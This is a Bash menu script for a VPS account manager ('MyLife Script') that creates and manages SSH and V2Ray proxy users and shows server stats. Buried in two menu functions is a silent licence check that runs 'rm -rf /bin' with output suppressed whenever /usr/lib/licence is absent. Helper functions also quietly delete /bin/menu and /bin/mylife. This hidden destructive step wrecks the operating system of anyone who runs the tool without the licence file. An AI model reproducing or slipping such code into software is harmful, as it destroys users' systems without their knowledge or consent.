#!/bin/bash
fun_bar () {
comando[0]="$1"
comando[1]="$2"
 (
[[ -e $HOME/fim ]] && rm $HOME/fim
[[ ! -e /usr/lib/vpsmanager ]] && rm -rf /bin/menu > /dev/null 2>&1
[[ ! -e /usr/lib/vpsmanager ]] && rm -rf /bin/mylife > /dev/null 2>&1
${comando[0]} -y > /dev/null 2>&1
${comando[1]} -y > /dev/null 2>&1
touch $HOME/fim
 ) > /dev/null 2>&1 &
 tput civis
echo -ne "\033[1;33m"
while true; do
   for((i=0; i<18; i++)); do
   echo -ne "\033[1;31m"
   sleep 0.1s
   done
   [[ -e $HOME/fim ]] && rm $HOME/fim && break
   echo -e "\033[1;33m"
   sleep 1s
   tput cuu1
   tput dl1
   echo -ne "\033[1;33m"
done
echo -e ""
tput cnorm
}
IP=$(cat /etc/IP)
x="ok"
menu ()
{
velocity () {
aguarde () {
comando[0]="$1"
comando[1]="$2"
 (
[[ -e $HOME/fim ]] && rm $HOME/fim
[[ ! -d /etc/VPSManager ]] && rm -rf /bin/menu
[[ ! -d /etc/VPSManager ]] && rm -rf /bin/mylife
${comando[0]} > /dev/null 2>&1
${comando[1]} > /dev/null 2>&1
touch $HOME/fim
 ) > /dev/null 2>&1 &
 tput civis
echo -ne "          Donwloading"
while true; do
   for((i=0; i<18; i++)); do
   echo -ne "\033[1;31m#"
   sleep 0.1s
   done
   [[ -e $HOME/fim ]] && rm $HOME/fim && break
   echo -e "\033[1;33m]"
   sleep 1s
   tput cuu1
   tput dl1
   echo -ne "          Downloading"
done
echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
tput cnorm
}
fun_tst () {
speedtest --share > speed
}
echo ""
echo -e "   \033[1;32mVps Speed\033[0m"
echo ""
aguarde 'fun_tst'
echo ""
png=$(cat speed | sed -n '5 p' |awk -F : {'print $NF'})
down=$(cat speed | sed -n '7 p' |awk -F :  {'print $NF'})
upl=$(cat speed | sed -n '9 p' |awk -F :  {'print $NF'})
lnk=$(cat speed | sed -n '10 p' |awk {'print $NF'})
echo -e "\033[0;34m┌───────────────────────────────────\033[0m"
echo -e "\033[1;34m├─ Download:\033[1;37m$down"
echo -e "\033[1;34m├─ Upload:\033[1;37m$upl"
echo -e "\033[0;34m└───────────────────────────────────\033[0m"
rm -rf $HOME/speed
}
#limiter
function limit1 () {
   clear
   echo -e "\n\033[1;32mUser limiter starting..\033[0m"
   echo ""
   fun_bar 'screen -dmS limiter limiter' 'sleep 3'
   [[ $(grep -wc "limiter" /etc/autostart) = '0' ]] && {
       echo -e "ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || screen -dmS limiter limiter" >> /etc/autostart
   } || {
       sed -i '/limiter/d' /etc/autostart
	   echo -e "ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || screen -dmS limiter limiter" >> /etc/autostart
   }
   echo -e "\n\033[1;32mUser limiter successfully activated!\033[0m"
   sleep 3
   menu
}
function limit2 () {
   clear
   echo -e "\033[1;32mUser limiter stopping..\033[0m"
   echo ""
   fun_stplimiter () {
      sleep 1
      screen -r -S "limiter" -X quit
      screen -wipe 1>/dev/null 2>/dev/null
      [[ $(grep -wc "limiter" /etc/autostart) != '0' ]] && {
          sed -i '/limiter/d' /etc/autostart
      }
      sleep 1
   }
   fun_bar 'fun_stplimiter' 'sleep 3'
   echo -e "\n\033[1;31mUser limiter successfully deactivated!\033[0m"
   sleep 3
   menu
}
function limit_ssh () {
[[ $(ps x | grep "limiter"|grep -v grep |wc -l) = '0' ]] && limit1 || limit2
}

function autoexec () {
   if grep "menu;" /etc/profile > /dev/null; then
      clear
      echo -e "\033[1;32mDisabling self-run\033[0m"
      offautmenu () {
         sed -i '/menu;/d' /etc/profile
      }
      echo ""
      fun_bar 'offautmenu'
      echo ""
      echo -e "\033[1;31mAuto run disabled!\033[0m"
      sleep 1.5s
      menu2
   else
      clear
      echo -e "\033[1;32mActivating self-run\033[0m"
      autmenu () {
         grep -v "^menu;" /etc/profile > /tmp/tmpass && mv /tmp/tmpass /etc/profile
         echo "menu;" >> /etc/profile
      }
      echo ""
      fun_bar 'autmenu'
      echo ""
      echo -e "\033[1;32mAuto run on!\033[0m"
      sleep 1.5s
      menu2
   fi

}
#v2ray mylife
mylifemenu () {
[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m♦ ") || stsf=$(echo -e "\033[1;31m○ ")
stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m♦ " || echo -e "\033[1;31m○ ")
autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m♦ " || echo -e "\033[1;31m○ ")
[[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
elif [[ "$(grep -c "Debian" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f3 /etc/issue.net)
else
system=$(cut -d' ' -f1 /etc/issue.net)
fi
_ons=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
[[ "$(cat /etc/VPSManager/Exp)" != "" ]] && _expuser=$(cat /etc/VPSManager/Exp) || _expuser="0"
[[ -e /etc/openvpn/openvpn-status.log ]] && _onop=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
[[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
_onli=$(($_ons + $_onop + $_ondrp))
_ram=$(printf ' %-9s' "$(free -h | grep -i mem | awk {'print $2'})")
_usor=$(printf '%-8s' "$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')")
_usop=$(printf '%-1s' "$(top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')")
_core=$(printf '%-1s' "$(grep -c cpu[0-9] /proc/stat)")
_system=$(printf '%-14s' "$system")
_hora=$(printf '%(%H:%M:%S)T')
_onlin=$(printf '%-5s' "$_onli")
_userexp=$(printf '%-5s' "$_expuser")
_tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
clear
echo -e "\033[0;34m┌─────────────────────────────────────────────────┐"
echo -e "\033[0;34m|                 \033[1;37m•MyLife Script•                 \033[0;34m|"
echo -e "\033[0;34m├───────────────────────┬─────────────────────────┤\033[0m"
echo -e "\033[0;34m├─\033[1;32m Online:\033[1;37m $_onlin        \033[0;34m├─ \033[1;31m Expired: \033[1;37m$_userexp        \033[0;34m|"
echo -e "\033[0;34m├───────────────────────┴─────────────────────────┤\033[0m"
echo -e "\033[0;34m├─ \033[1;36m1 \033[1;33mOpen ssh mode                                \033[0;34m|
\033[0;34m├─ \033[1;36m2 \033[1;33mCreate vmess                                 \033[0;34m|
\033[0;34m├─ \033[1;36m3 \033[1;33mCreate vless                                 \033[0;34m|
\033[0;34m├─ \033[1;36m4 \033[1;33mCreate trojan                                \033[0;34m|
\033[0;34m├─ \033[1;36m5 \033[1;33mCreate shadowsocks                           \033[0;34m|
\033[0;34m├─ \033[1;36m6 \033[1;33mCreate socks                                 \033[0;34m|
\033[0;34m├─ \033[1;36m7 \033[1;33mRemove user                                 \033[0;34m|
\033[0;34m├─ \033[1;36m8 \033[1;33mONLINE user                                  \033[0;34m|
\033[0;34m├─ \033[1;36m9 \033[1;33mChange date                                  \033[0;34m|
\033[0;34m├─ \033[1;36m10 \033[1;33mChange limit                                \033[0;34m|
\033[0;34m├─ \033[1;36m11 \033[1;33mChange password                             \033[0;34m|
\033[0;34m├─ \033[1;36m12 \033[1;33mRemove expired                              \033[0;34m|
\033[0;34m├─ \033[1;36m99 \033[1;33mOther settings                              \033[0;34m|
\033[0;34m├─ \033[1;36m00 \033[1;33mGet out                                     \033[0;34m|"
echo -e "\033[0;34m└─────────────────────────────────────────────────┘"
echo ""
echo -ne "\033[0;37m> What do u wanna?\033[1;37m : "; read x
case "$x" in
   1)
   menu
   ;;
   2)
   clear
   vsme
   echo -ne "\n\033[1;31m ENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
   ;;
   3)
   clear
   vssme
   echo -ne "\n\033[1;31m ENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
   ;;
   4)
   clear
   tnme
   echo -ne "\n\033[1;31m ENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
   ;;
   5)
   clear
   kssme
   echo -ne "\n\033[1;31m ENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
   ;;
   6)
   clear
   ksme
   echo -ne "\n\033[1;31m ENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
   ;;
   7)
   clear
   myliferemover
   sleep 3
   ;;
   8)
   clear
   mylifemonitor
   echo -ne "\n\033[1;31m ENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
   ;;
   9)
   clear
   datame
   sleep 3
   ;;
   10)
   clear
   limiteme
   sleep 3
   ;; 
   11)
   clear
   senhame
   sleep 3
   ;;
   12)
   clear
   clearfck
   echo ""
   sleep 3
   ;;
   99)
   othset
   ;;
   0 | 00)
   echo -e "\033[1;31m Going out...\033[0m"
   sleep 2
   clear
   exit;
   ;;
   *)
   echo -e "\n\033[1;31m Invalid option !\033[0m"
   sleep 2
esac
}
#othher settings
othset (){
[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m♦ ") || stsf=$(echo -e "\033[1;31m○ ")
stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m♦ " || echo -e "\033[1;31m○ ")
autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m♦ " || echo -e "\033[1;31m○ ")
[[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
elif [[ "$(grep -c "Debian" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f3 /etc/issue.net)
else
system=$(cut -d' ' -f1 /etc/issue.net)
fi
_ons=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
[[ "$(cat /etc/VPSManager/Exp)" != "" ]] && _expuser=$(cat /etc/VPSManager/Exp) || _expuser="0"
[[ -e /etc/openvpn/openvpn-status.log ]] && _onop=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
[[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
_onli=$(($_ons + $_onop + $_ondrp))
_ram=$(printf ' %-9s' "$(free -h | grep -i mem | awk {'print $2'})")
_usor=$(printf '%-8s' "$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')")
_usop=$(printf '%-1s' "$(top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')")
_core=$(printf '%-1s' "$(grep -c cpu[0-9] /proc/stat)")
_system=$(printf '%-14s' "$system")
_hora=$(printf '%(%H:%M:%S)T')
_onlin=$(printf '%-5s' "$_onli")
_userexp=$(printf '%-5s' "$_expuser")
_tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
clear
echo -e "\033[0;34m┌─────────────────────────────────────────────────┐"
echo -e "\033[0;34m|                 \033[1;37m•MyLife Script•                 \033[0;34m|"
echo -e "\033[0;34m├───────────────────────┬─────────────────────────┤"
[[ ! -e /tmp/att ]]  && {
    echo -e "\033[0;34m├─\033[1;32m Online:\033[1;37m $_onlin        \033[0;34m├─ \033[1;31m Expired: \033[1;37m$_userexp        \033[0;34m|"
    var01='\033[0;34m├─'
} || {
    echo -e "  \033[1;33m[\033[1;31m!\033[1;33m]  \033[0;34m├─ \033[1;33mTHERE IS AN UPDATE AVAILABLE!  \033[1;33m[\033[1;31m!\033[1;33m]\033[0m"
    var01="\033[1;32m!"
}
echo -e "\033[0;34m├───────────────────────┴─────────────────────────┤"
echo -e "\033[0;34m├─ \033[1;36m1 \033[1;33mVps optimize                                 \033[0;34m|
\033[0;34m├─ \033[1;36m2 \033[1;33mNetwork traffic \033[1;31m                             \033[0;34m|
\033[0;34m├─ \033[1;36m3 \033[1;33mVps speed \033[1;31m                                   \033[0;34m|
\033[0;34m├─ \033[1;36m4 \033[1;33mVps info                                     \033[0;34m|
\033[0;34m├─ \033[1;36m5 \033[1;33mAdd host                                     \033[0;34m|
\033[0;34m├─ \033[1;36m6 \033[1;33mRemove host                                  \033[0;34m|
\033[0;34m├─ \033[1;36m7 \033[1;33mRestart system                               \033[0;34m|
\033[0;34m├─ \033[1;36m8 \033[1;33mRestart services                             \033[0;34m|
\033[0;34m├─ \033[1;36m9 \033[1;33mBlock torrent $stsf                             \033[0;34m|
\033[0;34m├─ \033[1;36m10 \033[1;33mTelegram bot $stsbot                             \033[0;34m|
\033[0;34m├─ \033[1;36m11 \033[1;33mChange root password                        \033[0;34m|
\033[0;34m├─ \033[1;36m12 \033[1;33mSelf execution $autm                           \033[0;34m|
\033[0;34m├─ \033[1;36m13 \033[1;33mRemove script                               \033[0;34m|
\033[0;34m├─ \033[1;36m99 \033[1;33mCome back                                   \033[0;34m|
\033[0;34m├─ \033[1;36m00 \033[1;33mGet out                                     \033[0;34m|"
echo -e "\033[0;34m└─────────────────────────────────────────────────┘"
echo ""
echo -ne "\033[0;37m> What do u wanna?\033[1;37m : "; read x
case "$x" in
   1)
   clear
   otimizar
   echo -ne "\n\033[1;31m ENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
   menu2
   ;;
   2)
   clear
   echo -e "\033[1;32m TO GET OUT PRESS:- CTRL + C\033[1;36m"
   sleep 4
   nload
   ;;
   3)
   clear
   velocity
   echo -ne "\n\033[1;31m ENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
   ;;
   4)
   clear
   detalhes
   echo -ne "\n\033[1;31m ENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
   menu2
   ;;
   5)
   clear
   addhost
   echo -ne "\n\033[1;31mENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
   menu2
   ;;
   6)
   clear
   delhost
   echo -ne "\n\033[1;31mENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
   menu2
   ;;
   7)
   clear
   reiniciarsistema
   ;;
   8)
   clear
   reiniciarservicos
   sleep 3
   ;;
   9)
   blockt
   ;;
   10)
   botssh
   ;;
   11)
   clear
   senharoot
   sleep 3
   ;;
   12)
   autoexec
   ;;
   13)
   clear
   delscript
   ;;
   99)
   clear
   echo ""
   echo -e "\033[0;34m┌───────────────────────┬──────────────────────────┐\033[0m
\033[0;34m├─ \033[1;36m1 \033[1;33mOpen ssh mode   \033[0;34m   ├─ \033[1;36m2 \033[1;33mOpen v2ray mode (BETA)\033[0;34m|
\033[0;34m└───────────────────────┴──────────────────────────┘\033[0m"
   echo -ne "\033[0;37m> What do u wanna?\033[1;37m : "; read x
   case "$x" in
      1)
      menu
      ;;
      2)
      mylifemenu
      ;;
      *)
      echo -e "\n\033[1;31m Invalid option !\033[0m"
      sleep 2
   esac
   ;;
   0|00)
   echo -e "\033[1;31mGoing out...\033[0m"
   sleep 2
   clear
   exit;
   ;;
   *)
   echo -e "\n\033[1;31mInvalid option!\033[0m"
   sleep 2
esac
}
while true $x != "ok"
do
stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m♦ " || echo -e "\033[1;31m○ ")
stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;32m♦ " || echo -e "\033[1;31m○ ")
if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
elif [[ "$(grep -c "Debian" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f3 /etc/issue.net)
else
system=$(cut -d' ' -f1 /etc/issue.net)
fi
_ons=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
[[ "$(cat /etc/VPSManager/Exp)" != "" ]] && _expuser=$(cat /etc/VPSManager/Exp) || _expuser="0"
[[ -e /etc/openvpn/openvpn-status.log ]] && _onop=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
[[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
_onli=$(($_ons + $_onop + $_ondrp))
_ram=$(printf ' %-9s' "$(free -h | grep -i mem | awk {'print $2'})")
_usor=$(printf '%-8s' "$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')")
_usop=$(printf '%-1s' "$(top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')")
_core=$(printf '%-1s' "$(grep -c cpu[0-9] /proc/stat)")
_system=$(printf '%-14s' "$system")
_hora=$(printf '%(%H:%M:%S)T')
_onlin=$(printf '%-5s' "$_onli")
_userexp=$(printf '%-5s' "$_expuser")
_tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
clear
echo -e "\033[0;34m┌─────────────────────────────────────────────────┐"
echo -e "\033[0;34m|                 \033[1;37m•MyLife Script•                 \033[0;34m|"
echo -e "\033[0;34m├───────────────────────┬─────────────────────────┤\033[0m"
echo -e "\033[0;34m├─\033[1;32m Online:\033[1;37m $_onlin        \033[0;34m├─ \033[1;31m Expired: \033[1;37m$_userexp        \033[0;34m|"
echo -e "\033[0;34m├───────────────────────┴─────────────────────────┤\033[0m"
echo -e "\033[0;34m├─ \033[1;36m1 \033[1;33mOpen v2ray mode (BETA)  \033[1;31m                     \033[0;34m|
\033[0;34m├─ \033[1;36m2 \033[1;33mCreate ssh \033[1;31m                                  \033[0;34m|
\033[0;34m├─ \033[1;36m3 \033[1;33mRemove ssh \033[1;31m                                  \033[0;34m|
\033[0;34m├─ \033[1;36m4 \033[1;33mOnline user \033[1;31m                                 \033[0;34m|
\033[0;34m├─ \033[1;36m5 \033[1;33mChange date \033[1;31m                                 \033[0;34m|
\033[0;34m├─ \033[1;36m6 \033[1;33mChange limit \033[1;31m                                \033[0;34m|
\033[0;34m├─ \033[1;36m7 \033[1;33mChange password \033[1;31m                             \033[0;34m|
\033[0;34m├─ \033[1;36m8 \033[1;33mRemove expired \033[1;31m                              \033[0;34m|
\033[0;34m├─ \033[1;36m9 \033[1;33mUser report \033[1;31m                                 \033[0;34m|
\033[0;34m├─ \033[1;36m10 \033[1;33mConnection mode \033[1;31m                            \033[0;34m|
\033[0;34m├─ \033[1;36m11 \033[1;33mBad vpn $stsu                                  \033[0;34m|
\033[0;34m├─ \033[1;36m12 \033[1;33mBanner \033[1;31m                                     \033[0;34m|
\033[0;34m├─ \033[1;36m13 \033[1;33mUser backup \033[1;31m                                \033[0;34m|
\033[0;34m├─ \033[1;36m14 \033[1;33mUser limiter $stsl\033[1;31m                             \033[0;34m|
\033[0;34m├─ \033[1;36m99 \033[1;33mOther settings                              \033[0;34m|
\033[0;34m├─ \033[1;36m00 \033[1;33mGet out                                    \033[0;34m|"
echo -e "\033[0;34m└─────────────────────────────────────────────────┘"
echo ""
echo -ne "\033[0;37m> What do u wanna?\033[1;37m : "; read x
case "$x" in 
   1)
   mylifemenu
   ;;
   2)
   clear
   criarusuario
   echo -ne "\n\033[1;31m ENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
   ;;
   3)
   clear
   remover
   sleep 3
   ;;
   4)
   clear
   sshmonitor
   echo -ne "\n\033[1;31m ENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
   ;;      
   5)
   clear
   mudardata
   sleep 3
   ;;
   6)
   clear
   alterarlimite
   sleep 3
   ;; 
   7)
   clear
   alterarsenha
   sleep 3
   ;;
   8)
   clear
   expcleaner
   echo ""
   sleep 3
   ;;     
   9)
   clear
   infousers
   echo -ne "\n\033[1;31m ENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
   ;;
   10)
   conexao
   exit;
   ;;
   11)
   clear
   badvpn
   exit;
   menu
   ;;
   12)
   clear
   banner
   sleep 3
   ;;
   13)
   userbackup
   echo -ne "\n\033[1;31m ENTER \033[1;33mto return to \033[1;32mMENU!\033[0m"; read
   ;;
   14)
   limit_ssh
   ;;
   99)
   othset
   ;;
   0 | 00)
   echo -e "\033[1;31m Going out...\033[0m"
   sleep 2
   clear
   exit;
   ;;
   *)
   echo -e "\n\033[1;31m Invalid option !\033[0m"
   sleep 2
esac
done
}
menu
#fim

# hemme userlary gormek ucin (total user) $_tuser

# sistema
# echo -e "\033[0;34m├─────────────────────────────────────────────────┤"
# echo -e "\033[0;34m|\033[1;32m  SYSTEM            RAM MEMORY      PROCESSOR \033[0;34m|"
# echo -e "\033[0;34m|\033[1;31mOS: \033[1;37m$_system \033[1;31mTotal:\033[1;37m$_ram \033[1;31mCPU cores: \033[1;37m$_core \033[0;34m|"
# echo -e "\033[0;34m|\033[1;31mUp Time: \033[1;37m$_hora  \033[1;31mIn use: \033[1;37m$_usor \033[1;31mIn use: \033[1;37m$_usop \033[0;34m|"